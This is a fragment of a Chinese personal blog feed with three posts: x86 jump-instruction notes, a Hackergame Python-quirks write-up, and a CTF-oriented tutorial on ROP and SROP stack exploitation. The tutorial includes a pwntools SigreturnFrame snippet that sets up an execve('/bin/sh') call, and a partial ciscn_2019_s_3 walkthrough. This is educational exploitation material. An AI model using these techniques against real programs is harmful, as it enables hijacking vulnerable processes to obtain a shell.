<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>test a,b<br>测试(两值作与运算,仅改变标志位，不返回结果)，常用<code>test a,a</code>指令来测试a是否为0。</p>
<h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">条件</th>
<th align="center">相反指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JMP</td>
<td align="center">直接跳转</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">JC</td>
<td align="center">CF==1</td>
<td align="center">JNC</td>
</tr>
<tr>
<td align="center">JZ(JE)</td>
<td align="center">ZF==1</td>
<td align="center">JNZ(JNE)</td>
</tr>
<tr>
<td align="center">JS</td>
<td align="center">SF==1</td>
<td align="center">JNS</td>
</tr>
<tr>
<td align="center">JO</td>
<td align="center">OF==1</td>
<td align="center">JNO</td>
</tr>
<tr>
<td align="center">JNP(JPO)</td>
<td align="center">PF==0</td>
<td align="center">JP</td>
</tr>
<tr>
<td align="center">JA(JNBE)</td>
<td align="center">无符号大于</td>
<td align="center">JNA(JBE)</td>
</tr>
<tr>
<td align="center">JNAE(JB)</td>
<td align="center">无符号小于</td>
<td align="center">JAE(JNB)</td>
</tr>
<tr>
<td align="center">JG(JNLE)</td>
<td align="center">有符号大于</td>
<td align="center">JNG(JLE)</td>
</tr>
<tr>
<td align="center">JNGE(JL)</td>
<td align="center">有符号小于</td>
<td align="center">JGE(JNL)</td>
</tr>
<tr>
<td align="center">JP</td>
<td align="center">奇偶位置位</td>
<td align="center">JNP</td>
</tr>
<tr>
<td align="center">JPE</td>
<td align="center">奇偶位相等</td>
<td align="center">JPO</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>Python奇技淫巧</title>
    <url>/2019/11/12/wtfPython/</url>
    <content><![CDATA[<p>问题来源于2019Hackergame中一道考察 Python 语言奇技淫巧（各种边界情况）的题，Python版本为3.7.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_1</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    <span class="keyword">if</span> answer == <span class="string">&quot;Hello&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>直接输入 <code>&#39;Hello&#39;</code> 即可过关。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_2</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b, c, d = answer</span><br><span class="line">    <span class="keyword">if</span> a == b <span class="keyword">and</span> a <span class="keyword">is</span> b <span class="keyword">and</span> c == d <span class="keyword">and</span> c <span class="keyword">is</span> <span class="keyword">not</span> d:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>Python 中 <code>==</code> 表示判断相等关系，而 <code>is</code> 判断是否为同一个对象。相等并且为同一个对象的例子可以是 <code>None</code>。一些整数和字符串也可能满足这个性质，但这与实现有关，Python 并不保证这一点。</p>
<p>相等但是不为同一个对象的例子，找一种可变的数据类型即可，例如列表。</p>
<p>一个例子：<code>1, 1, [1], [1]</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_3</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    <span class="keyword">if</span> answer <span class="keyword">in</span> answer == answer:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>这里 <code>in</code> 和 <code>==</code> 的优先级是什么呢？其实 Python 中比较运算这样连起来写等价于 <code>answer in answer and answer == answer</code>，正如 <code>1 &lt; x &lt; 2</code> 等价于 <code>1 &lt; x and x &lt; 2</code>。</p>
<p>随便一个字符串都可以过关。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_4</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a1, b1 = answer</span><br><span class="line">    a2, b2 = answer</span><br><span class="line">    <span class="keyword">if</span> a1 * <span class="number">2</span> != a1 <span class="keyword">and</span> b1 * <span class="number">2</span> != b1:</span><br><span class="line">        a1 *= <span class="number">2</span></span><br><span class="line">        b1 *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a1 == a2 <span class="keyword">and</span> b1 != b2:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>这个小题需要我们找到两个对象，其中一个 <code>*= 2</code> 之后对象本身会改变（和自己的另一个引用相等），而另一个对象 <code>*= 2</code> 之后引用改变（和原来自己的引用不相等）。找一个 mutable 和一个 immutable 即可，例如 <code>[1], 1</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_5</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    r = reversed([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> list(r) == list(r) + answer:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>看上去像是 <code>answer = []</code>，但实际上 <code>reversed([1, 2, 3])</code> 是一个 iterator，遍历一次之后就空了，所以答案是 <code>[3, 2, 1]</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_6</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b = answer</span><br><span class="line">    <span class="keyword">if</span> max(a, b) != max(b, a):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p><code>max</code> 函数用对象之间的比较运算来取出最大值。我们可以找 <code>&#123;0&#125;, &#123;1&#125;</code> 这两个集合，Python 中集合的比较运算是判断（真）子集关系，所以 <code>&#123;0&#125; &gt; &#123;1&#125;</code> 和 <code>&#123;1&#125; &gt; &#123;0&#125;</code> 都是 <code>False</code>，两次 <code>max</code> 结果不同。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_7</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b, c = answer</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> a, b, c:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, float) <span class="keyword">or</span> isinstance(x, complex):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> a * (b + c) != a * b + a * c:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>不满足乘法分配律？Python 中的乘法不一定是对数值进行，字符串和列表也可以和整数做乘法，所以很容易找到 <code>2, &#39;a&#39;, &#39;b&#39;</code> 这样的解，此时等号两边是 <code>abab</code> 和 <code>aabb</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_8</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b, c = answer</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> a, b, c:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, float) <span class="keyword">or</span> isinstance(x, complex):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> a * (b * c) != (a * b) * c:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>不满足乘法结合律？也可以和上一题一样用字符串或者列表来构造。这里可以利用它们乘以负数时总是会得到空串的性质，例如一个解是 <code>[0], -1, -1</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_9</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b = answer</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> a, b:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, float) <span class="keyword">or</span> isinstance(x, complex):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> type(a ** b) != type(b ** a):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>需要 <code>a ** b</code> 和 <code>b ** a</code> 的类型不同。这里想要考察，Python 中相同基本类型的运算结果类型，可能与具体的值相关。</p>
<p><code>(-1) ** 2 = 1</code>，是 <code>int</code> 类型，而 <code>2 ** (-1) = 0.5</code>，是 <code>float</code> 类型。若没有判断不能为浮点型也可以用 <code>(-1) ** 0.5</code> 来得到 <code>complex</code> 复数类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_10</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b = answer</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">and</span> a.count(b) &gt; len(a):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p><code>a</code> 非空，并且 <code>a</code> 里面对 <code>b</code> 进行无覆盖的计数结果大于 <code>a</code> 的长度，这看起来不可能，其实 <code>b</code> 是空串的时候就可以。一个可能的解是 <code>&#39;a&#39;, &#39;&#39;</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_11</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    <span class="keyword">if</span> max(answer) != max(*answer):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>Python 中的函数可以以 <code>max(1, 2, 3)</code> 的形式调用，也可以以 <code>max([1, 2, 3])</code> 的形式调用。当参数个数为 1 时，就会匹配后一种形式。所以我们只需要让 <code>answer</code> 列表里面只有一个元素，这样 <code>max(*answer)</code> 就也会匹配到第二种形式，从而可以做到两个 <code>max</code> 的结果不相同。一个可能的解是 <code>[[0]]</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_12</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b = answer</span><br><span class="line">    <span class="keyword">if</span> a &lt; b <span class="keyword">and</span> all(x &gt; y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p><code>a</code> 比 <code>b</code> 小，但是 <code>a</code> 中的每个元素都比 <code>b</code> 中对应位置的元素大？看起来不大可能，其实 <code>a</code> 是空列表并且 <code>b</code> 非空的时候就可以做到，因为 <code>a</code> 中根本没有元素，对空集计算 <code>all</code> 会得到 <code>True</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_13</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b = answer</span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">and</span> <span class="keyword">not</span> (a ^ b) - a:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>看似 <code>a</code> 和 <code>b</code> 是两个整数，但如果这样的话，我们可以推出 <code>a ^ b == a</code>，从而 <code>b == 0</code>，矛盾，这是不可能的。除了整数以外，集合也支持 <code>^</code> 和 <code>-</code> 运算，很容易找到满足题目中关系的集合，例如 <code>&#123;1&#125;, &#123;1&#125;</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_14</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    backup = deepcopy(answer)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        answer[<span class="number">0</span>] += answer[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> backup != answer:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>这里 <code>answer[0] += answer[1]</code> 一行执行时需要产生异常，但是却需要 <code>answer</code> 的值发生变化。这是 Python 官方文档 FAQ 中<a href="https://docs.python.org/3/faq/programming.html#why-does-a-tuple-i-item-raise-an-exception-when-the-addition-works">指出</a>的一种特殊情况，让 <code>answer</code> 是 tuple 并且 <code>answer[0]</code> 是 list 就可能触发这种情况，原因是 list 的 <code>+=</code> 运算可以正常进行，但是接下来在 tuple 中更新引用时会失败，tuple 是 immutable 类型。答案可以是 <code>[1], [1]</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_15</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    item, l = answer</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> l <span class="keyword">and</span> <span class="keyword">not</span> min(l) &lt;= item &lt;= max(l):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>看起来似乎需要找一个列表和一个列表中的元素，元素不在列表的最大和最小值之间。但其实 <code>item</code> 和 <code>l</code> 都可以是字符串，此时 <code>item</code> 可以是一个长度大于等于 2 的字符串，而 <code>min(l)</code> 和 <code>max(l)</code> 都是按单个字符计算的。一个可能的答案是 <code>&#39;aa&#39;, &#39;aaa&#39;</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_16</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    item, l = answer</span><br><span class="line">    <span class="keyword">if</span> item == <span class="number">233</span> <span class="keyword">and</span> item <span class="keyword">in</span> l <span class="keyword">and</span> l <span class="keyword">in</span> l:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>看似不可能。我们可以从 <code>l in l</code> 开始思考，Python 中什么字面量可以 <code>in</code> 它自己呢？可以是字符串或者 <code>bytes</code>。对 <code>bytes</code> 进行遍历时，元素是 0~255 范围的 <code>int</code>，所以 <code>233, b&#39;\xe9&#39;</code> 可以满足条件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_17</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    item, l = answer</span><br><span class="line">    <span class="keyword">if</span> l[<span class="number">0</span>] == item <span class="keyword">and</span> item <span class="keyword">not</span> <span class="keyword">in</span> l:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>对 <code>l</code> 取下标 <code>0</code> 得到的元素并不 <code>in l</code>，这可能吗？可以想想 Python 的各种基本类型，其中 <code>dict</code> 就可以满足我们的要求，因为对 <code>dict</code> 类型取下标拿到的是 value，而判断对象是否 <code>in</code> 一个 dict 时，是根据 key 的集合判断的。一个可能的答案是 <code>1, &#123;0:1&#125;</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_18</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    a, b = answer</span><br><span class="line">    <span class="keyword">if</span> (a - b) != -(b - a):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>这个小题有点 tricky，看起来使用各种 <code>list</code>、<code>dict</code>、<code>set</code> 之类的东西搞不定了。我们可以拿出杀手锏，浮点数中的特殊值，<a href="https://stackoverflow.com/questions/17628613/what-is-inf-and-nan"><code>inf</code> 和 <code>nan</code></a>。这种浮点数并不能直接输入，但经过简单尝试可以发现，输入很大的数，例如 <code>1e999</code>，就可以得到 <code>inf</code>，而 <code>inf - inf</code> 可以得到 <code>nan</code>，<code>nan</code> 有一个性质就是 <code>nan == nan</code> 并不成立，所以这道题的答案可以是 <code>1e999, 1e999</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_19</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    <span class="keyword">if</span> answer.isdecimal():</span><br><span class="line">        <span class="keyword">if</span> len(answer) &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">if</span> sum(ord(c) - ord(<span class="string">&quot;0&quot;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> answer) == <span class="number">23333</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>长度小于 5 的字符串，每个字符都是 <code>decimal</code>，并且取 Unicode 码之后加起来需要等于 23333。我们可以发现，满足 <code>isdecimal()</code> 条件的字符，不只有 0~9 这 10 个数字，还有很多各种各样的 Unicode 字符。我们可以简单写一个程序输出它们：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x110000</span>):</span><br><span class="line">    <span class="keyword">if</span> chr(i).isdecimal():</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>

<p>在输出的这些 Unicode 码中，找到 5 个加起来是 23333 并不难，可以在适当的范围内手工尝试，也可以写程序搜索解决。例如一个可行的解是 <code>&#39;᱙᱙᱃۰&#39;</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_20</span>(<span class="params">self, answer</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(set(str(x) <span class="keyword">for</span> x <span class="keyword">in</span> answer)) == <span class="number">7</span> <span class="keyword">and</span> all(x == <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> answer):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>我们需要找到 7 个对象，它们转化为字符串之后各不相同，但是每个对象却都和 0 相等。比较好想到的例子是 <code>0</code>、<code>0.0</code>、<code>False</code> 和 <code>0j</code>，它们分别是 <code>int</code>、<code>float</code>、<code>bool</code>、<code>complex</code> 四种 Python 数值类型的对象。可 Python 只有这四种数值类型，另外三个去哪里找呢？</p>
<p>我们可以发现，浮点数标准中，是存在 <code>0.0</code> 和 <code>-0.0</code> 两个表示 0 的值的，它们相等。Python 中，<code>str(-0.0)</code> 可以得到 <code>&#39;-0.0&#39;</code> 这个字符串。我们可以类似构造出复数类型下面的各种包含浮点 <code>0.0</code> 和 <code>-0.0</code> 的组合。最终的 7 个对象是：<code>0, 0.0, -0.0, False, -0.0-0.0j, -0.0j, 0j</code>。</p>
<p>转载于<a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84_Python_%E8%80%83%E8%AF%95/README.md">2019hackergame不同寻常的python考试</a></p>
<p>另外关于Python有趣的冷知识的一些参考资料：</p>
<p><a href="https://github.com/satwikkansal/wtfpython">https://github.com/satwikkansal/wtfpython</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>rop_and_srop</title>
    <url>/2021/01/28/rop-and-srop/</url>
    <content><![CDATA[<p>一年没有更过博客了，这一年中在学了pwn相关，现在把博客重新整活过来，之后有时间把学的东西整理一下发出来。</p>
<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
<p>ROP的主要思想就是攻击者不需要自己注入代码（因为在DEP的保护下，注入的代码不可执行），而是利用系统已有的代码片段来构造攻击。这里之所以叫ROP，是因为其改变控制流的方式是用系统中的<code>return</code>指令（比如x86中的<code>ret</code>）。</p>
<p>ROP需要一个栈溢出，让攻击者可以修改栈上的数据，然后在程序中寻找一系列以<code>return</code>结尾的指令片段（我们将其称为”gadgets”）将其填入栈中合适的位置，通过<code>return</code>控制程序流将其连接起来，通过<code>pop</code>、<code>mov</code>等指令把写入栈相应位置的数据传到寄存器中，达到控制程序的目的。</p>
<p>gadgets可以用<code>ROPgadget</code>进行搜索</p>
<p>依赖安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install capstone</span><br></pre></td></tr></table></figure>

<p>ROPgadget安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install ROPgadget</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary elf --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>

<p>根据32位和64位程序不同的函数传参方式应该用不同的方式编写payload传参：</p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>将函数的参数从右向左一次压入栈中，写payload时可以直接将参数写在栈上对应的位置。</p>
<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><p>在 x64 体系中，多数调用惯例都是通过寄存器传递参数。在 Linux 上，前六个参数通过 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code> 传递，当参数为6个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样；而在 Windows 中，前四个参数通过 <code>RCX</code>、<code>RDX</code>、<code>R8</code> 和 <code>R9</code> 来传递。</p>
<p>参数个数大于 7 个的时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h);  </span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9  </span><br><span class="line">h-&gt;8(%esp)  </span><br><span class="line">g-&gt;(%esp)  </span><br><span class="line">call H</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/11/09/MeEqbV.png"></p>
<p>这种情况需要先把参数写入栈中，再利用程序中的<code>pop</code>和<code>mov</code>指令将参数传入相应的寄存器中，这些指令可以用ROPgadget寻找，<code>__libc_csu_init</code>函数中这段代码也常常拿来传参：</p>
<p><img src="https://s3.ax1x.com/2021/01/31/yEs1JK.png"></p>
<p>先控制程序返回到<code>0x400596</code>的位置，把写在栈上的数据<code>pop</code>到<code>r12</code>、<code>r13</code>等寄存器中，之后返回到<code>0x400580</code>将<code>r13</code>等寄存器中的数据转移到<code>rdx</code>等寄存器中，并调用<code>[r12+rbp*8]</code>处的函数。最近有学到一手可以把<code>[r12+rbp*8]</code>的设置成<code>pop;ret;</code>的地址来跳出csu。</p>
<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程（<code>kill -9 $PID</code>），再比如为进程设置定时器，或者通知进程一些异常事件等等。</p>
<p>如下图所示，当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p>
<p><img src="https://s3.ax1x.com/2021/01/31/yEfeVe.png"></p>
<p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p>
<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p>
<p><img src="https://s3.ax1x.com/2021/01/31/yE5XW9.png"></p>
<p>我们将这段内存称为一个<code>Signal Frame</code>。</p>
<p>在内核<code>sigreturn</code>系统调用处理函数中，会根据当前的栈指针指向的<code>Signal Frame</code>对进程上下文进行恢复，并返回用户态，从挂起点恢复执行</p>
<h2 id="Signal机制缺陷利用"><a href="#Signal机制缺陷利用" class="headerlink" title="Signal机制缺陷利用"></a>Signal机制缺陷利用</h2><p>内核替用户进程将其上下文保存在<code>Signal Frame</code>中，然后，内核利用这个<code>Signal Frame</code>恢复用户进程的上下文。这个<code>Signal Frame</code>是被保存在用户进程的地址空间中的，是用户进程可读写的；而且内核并没有将保存的过程和恢复的过程进行一个比较，也就是说，在<code>sigreturn</code>这个系统调用的处理函数中，内核并没有判断当前的这个<code>Signal Frame</code>就是之前内核为用户进程保存的那个<code>Signal Frame</code>。<br>因此，完全可以自己在栈上放好上下文，然后自己调用re_sigreturn，跳过步骤1、2。此时，我们将通过步骤3、4让内核把我们伪造的上下文恢复到用户进程中，也就是说我们可以重置所有寄存器的值，一次到位地做到控制通用寄存器，rip和完成栈劫持。</p>
<h2 id="一个简单的攻击"><a href="#一个简单的攻击" class="headerlink" title="一个简单的攻击"></a>一个简单的攻击</h2><p>假设一个攻击者可以控制用户进程的栈，那么它就可以伪造一个<code>Signal Frame</code>，如下图所示：</p>
<p><img src="https://s3.ax1x.com/2021/01/31/yEozVK.png"></p>
<p>在这个伪造的<code>Signal Frame</code>中，将<code>rax</code>设置成59（即<code>execve</code>系统调用号），将<code>rdi</code>设置成字符串<code>/bin/sh</code>的地址（该字符串可以是攻击者写在栈上的），将<code>rip</code>设置成系统调用指令<code>syscall</code>的内存地址，最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，在这个例子中，一旦<code>sigreturn</code>返回，就会去执行<code>execve</code>系统调用，打开一个shell。<br>这是一个最简单的攻击。在这个攻击中，有4个前提条件：</p>
<ol>
<li>攻击者可以通过stack overflow等漏洞控制栈上的内容；</li>
<li>需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；</li>
<li>需要知道<code>syscall</code>指令在内存中的地址；</li>
<li>需要知道<code>sigreturn</code>系统调用的内存地址。</li>
</ol>
<h2 id="利用SROP构造系统调用串"><a href="#利用SROP构造系统调用串" class="headerlink" title="利用SROP构造系统调用串"></a>利用SROP构造系统调用串</h2><p>通过再额外添加一个对栈指针<code>rsp</code>的控制，可以实现连续的系统调用：</p>
<p><img src="https://s3.ax1x.com/2021/01/31/yEHm9g.png"></p>
<p>另外需要把原来单纯的<code>syscall</code> gadget换成<code>syscall; ret</code> gadget。在这个过程中，每次<code>syscall</code>返回之后，栈指针都会指向下一个<code>Signal Frame</code>，因此，在这个时候执行<code>ret</code>指令，就会再次调用<code>sigreturn</code>系统调用。这样就可以通过操作栈来达到连续进行系统调用的效果。</p>
<h2 id="pwntools中的SROP"><a href="#pwntools中的SROP" class="headerlink" title="pwntools中的SROP"></a>pwntools中的SROP</h2><p>可以直接调用pwntools的SigreturnFrame来快速生成SROP帧，需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行，因此我们可以通过syscall指令调用rt_sigreturn而不必特意去寻找这个调用的完整实现。此外，由于32位分为原生的i386（32位系统）和i386 on amd64（64位系统添加32位应用程序支持）两种情况，这两种情况的段寄存器设置有所不同</p>
<blockquote>
<p>#原生i386<br>context.arch = ‘i386’<br>SROPFrame = SigreturnFrame(kernel=’i386’)</p>
<p>#amd64上运行的32位程序<br>context.arch = ‘i386’<br>SROPFrame = SigreturnFrame(kernel=’amd64’)</p>
<p>#例<br>frame=SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=bin_sh_addr<br>frame.rsi=0<br>frame.rdx=0<br>frame.rip=syscall_addr</p>
</blockquote>
<h1 id="例：ciscn-2019-s-3"><a href="#例：ciscn-2019-s-3" class="headerlink" title="例：ciscn_2019_s_3"></a>例：ciscn_2019_s_3</h1><p>保护：</p>
<blockquote>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre>
</blockquote>
<p>存在栈溢出,使用syscall系统调用：</p>
<p><img src="https://z3.ax1x.com/2021/05/26/2p3US0.png"></p>
<p>gadgets:</p>
<p><img src="https://z3.ax1x.com/2021/05/26/2p36YR.png"></p>
<p>其中0fh是<code>rt_sigreturn</code>的系统调用号，3Bh是<code>execve</code>的系统调用号。</p>
<p>vuln函数汇编：</p>
<p><img src="https://z3.ax1x.com/2021/05/26/2p3Rl6.png"></p>
<p>函数开始时把caller函数rbp压栈但在结束时没有取出，所以函数返回的地址其实是caller函数rbp的地址，是一个栈上的地址所以程序正常执行会报错，所以我们在进行栈溢出的时候只需要把返回地址写到rbp的位置。</p>
